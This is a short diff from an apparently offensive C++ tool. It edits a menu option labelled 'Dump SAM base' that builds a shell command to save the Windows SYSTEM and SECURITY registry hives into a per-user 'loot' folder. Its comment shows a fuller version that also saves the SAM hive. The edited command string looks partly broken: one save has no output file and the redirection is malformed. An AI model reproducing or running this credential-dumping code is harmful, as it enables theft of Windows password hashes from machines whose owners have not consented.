@@ -103,7 +103,7 @@ int main(){
 
         else if (choice == "4"){
             // Dump SAM base ( payload : @echo off && mkdir loot/%USERNAME%_base_sam && cd loot/%USERNAME%_base_sam >NUL 2>&1 && reg save hklm\sam ./sam.save && reg save hklm\system ./system.save && reg save hklm\security ./security.save )
-            string payload = "@echo off && " + bin_path + "/mkdir loot/" + "%" + "USERNAME" + "%_base_sam && " + bin_path + "/cd loot/" + "%" + "USERNAME" + "%_base_sam >NUL>&1 && " + bin_path + "/reg save hklm\\system ./system.save && " + bin_path + "/reg save hklm\\security.save";
+            string payload = "@echo off && mkdir loot/%USERNAME%_base_sam && cd loot/%USERNAME%_base_sam >NUL>&1 && reg save hklm\\system ./system.save && reg save hklm\\security.save";
             system(payload.c_str());
 
             system("echo test > loot/test.txt");
